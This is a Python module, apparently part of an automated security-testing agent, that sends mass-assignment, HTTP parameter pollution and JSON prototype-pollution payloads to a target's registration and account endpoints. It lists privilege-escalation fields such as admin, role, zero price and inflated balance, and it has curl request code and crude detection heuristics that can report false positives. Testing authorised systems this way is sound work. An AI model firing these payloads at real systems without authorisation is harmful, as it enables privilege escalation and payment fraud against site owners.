"""
Mass Assignment / HTTP Parameter Pollution — deterministic injection tests.

Tests:
1. Inject admin/role/is_admin params in registration/update
2. Inject unexpected params in POST/PUT
3. HTTP Parameter Pollution (duplicate params)
4. JSON prototype pollution (__proto__, constructor)
"""

import asyncio
import json
import re
from typing import Dict, List, Any
from skills.base import BaseSkill, SkillResult


# Parameters to test for mass assignment
PRIVILEGE_PARAMS = [
    {"admin": True},
    {"role": "admin"},
    {"is_admin": True},
    {"user_type": "admin"},
    {"account_type": "premium"},
    {"权限": "管理员"},
    {"is_superuser": True},
    {"permissions": ["admin", "read", "write", "delete"]},
    {"verified": True},
    {"email_verified": True},
    {"plan": "enterprise"},
    {"credits": 999999},
    {"balance": 999999},
    {"discount": 100},
    {"price": 0},
    {"paid": True},
    {"subscription": "premium"},
]

# Prototype pollution payloads
PROTOTYPE_PAYLOADS = [
    {"__proto__": {"admin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"is_admin": True}},
    {"toString": "valueOf"},
]

# Common form fields that may accept extra params
COMMON_ENDPOINTS = [
    "/register", "/signup", "/api/register", "/api/signup",
    "/api/user", "/api/users", "/api/profile", "/api/account",
    "/api/settings", "/api/update", "/api/me", "/api/auth/register",
]


class MassAssignmentSkill(BaseSkill):
    """
    Mass assignment and parameter pollution testing.
    """

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["mass_assignment", "hpp", "parameter_pollution", "privilege_escalation"]

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        target = context.get("target", "")
        urls = context.get("urls", [])
        
        findings = []
        
        # Test mass assignment on registration/update endpoints
        test_urls = urls[:5] + [f"https://{target}{ep}" for ep in COMMON_ENDPOINTS]
        
        for url in test_urls[:10]:
            # Test privilege escalation params
            mass_findings = await self._test_mass_assignment(url)
            findings.extend(mass_findings)
            
            # Test prototype pollution
            proto_findings = await self._test_prototype_pollution(url)
            findings.extend(proto_findings)
            
            # Test HPP
            hpp_findings = await self._test_hpp(url)
            findings.extend(hpp_findings)

        return SkillResult(
            success=True,
            findings=findings,
            data={"urls_tested": len(test_urls), "mass_findings": len(findings)},
            next_skills=["validate"],
            confidence=min(len(findings) / 3, 1.0) if findings else 0.0,
        )

    async def _test_mass_assignment(self, url: str) -> List[Dict]:
        """Test mass assignment by injecting extra params."""
        findings = []
        
        # First, get baseline response
        baseline = await self._send_request(url, {"test": "value"})
        if not baseline:
            return findings
        
        # Test each privilege escalation param
        for params in PRIVILEGE_PARAMS[:5]:
            result = await self._send_request(url, {"test": "value", **params})
            if not result:
                continue
            
            # Check if response changed (suggesting param was accepted)
            if result.get("status") == 200 and result.get("status") == baseline.get("status"):
                # Response body may differ — check for evidence of acceptance
                body_diff = self._compare_responses(baseline.get("body", ""), result.get("body", ""))
                if body_diff:
                    findings.append({
                        "type": "mass_assignment",
                        "url": url,
                        "severity": "high",
                        "confidence": 0.8,
                        "cvss_score": 7.5,
                        "evidence": f"Parameter {json.dumps(params)} accepted — response changed",
                        "payload": json.dumps({"test": "value", **params}),
                        "param": list(params.keys())[0],
                        "description": f"Server accepts unexpected parameter: {list(params.keys())[0]}",
                        "source_tool": "mass-assignment",
                    })
            
            # Check for status code change (400 → 200 means validation bypass)
            if baseline.get("status") in (400, 422) and result.get("status") == 200:
                findings.append({
                    "type": "mass_assignment_validation_bypass",
                    "url": url,
                    "severity": "critical",
                    "confidence": 0.9,
                    "cvss_score": 9.0,
                    "evidence": f"Validation bypass: {baseline.get('status')} → 200 with {json.dumps(params)}",
                    "payload": json.dumps({"test": "value", **params}),
                    "param": list(params.keys())[0],
                    "description": f"Server validation bypassed via mass assignment: {list(params.keys())[0]}",
                    "source_tool": "mass-assignment",
                })
        
        return findings

    async def _test_prototype_pollution(self, url: str) -> List[Dict]:
        """Test for JavaScript prototype pollution."""
        findings = []
        
        for payload in PROTOTYPE_PAYLOADS:
            result = await self._send_json(url, payload)
            if result and result.get("status") == 200:
                # Check response for evidence of pollution
                body = result.get("body", "")
                if any(x in body for x in ["admin", "true", "role", "is_admin"]):
                    findings.append({
                        "type": "prototype_pollution",
                        "url": url,
                        "severity": "critical",
                        "confidence": 0.85,
                        "cvss_score": 9.0,
                        "evidence": f"Prototype pollution payload accepted: {json.dumps(payload)}",
                        "payload": json.dumps(payload),
                        "param": "JSON Body",
                        "description": "Prototype pollution vulnerability — server merges __proto__ into response",
                        "source_tool": "mass-assignment",
                    })
        
        return findings

    async def _test_hpp(self, url: str) -> List[Dict]:
        """Test HTTP Parameter Pollution."""
        findings = []
        
        try:
            # Send request with duplicate params
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10",
                "-X", "POST",
                "-H", "Content-Type: application/x-www-form-urlencoded",
                "-d", "user=admin&user=normal&role=admin&role=user",
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', response)
            status = int(status_match.group(1)) if status_match else 0
            
            if status in (200, 302):
                # Check which value was used
                body = response.lower()
                if "admin" in body and "normal" not in body:
                    findings.append({
                        "type": "hpp_admin_escalation",
                        "url": url,
                        "severity": "critical",
                        "confidence": 0.85,
                        "cvss_score": 9.0,
                        "evidence": "Duplicate 'user' param — server used 'admin' value",
                        "payload": "user=admin&user=normal",
                        "param": "POST Body",
                        "description": "HTTP Parameter Pollution — server uses first value (admin) over second (normal)",
                        "source_tool": "mass-assignment",
                    })
        except Exception:
            pass
        
        return findings

    async def _send_request(self, url: str, params: Dict) -> Dict:
        """Send POST request with form data."""
        try:
            data = "&".join(f"{k}={v}" for k, v in params.items())
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10",
                "-X", "POST",
                "-H", "Content-Type: application/x-www-form-urlencoded",
                "-d", data,
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', response)
            status = int(status_match.group(1)) if status_match else 0
            
            return {"status": status, "body": response}
        except Exception:
            return {}

    async def _send_json(self, url: str, data: Dict) -> Dict:
        """Send POST request with JSON body."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10",
                "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", json.dumps(data),
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', response)
            status = int(status_match.group(1)) if status_match else 0
            
            return {"status": status, "body": response}
        except Exception:
            return {}

    def _compare_responses(self, baseline: str, new: str) -> bool:
        """Check if responses differ meaningfully."""
        if baseline == new:
            return False
        # Ignore minor differences (timestamps, request IDs)
        b = re.sub(r'(timestamp|request_id|date|time)["\s:=]+\S+', '', baseline.lower())
        n = re.sub(r'(timestamp|request_id|date|time)["\s:=]+\S+', '', new.lower())
        return b != n
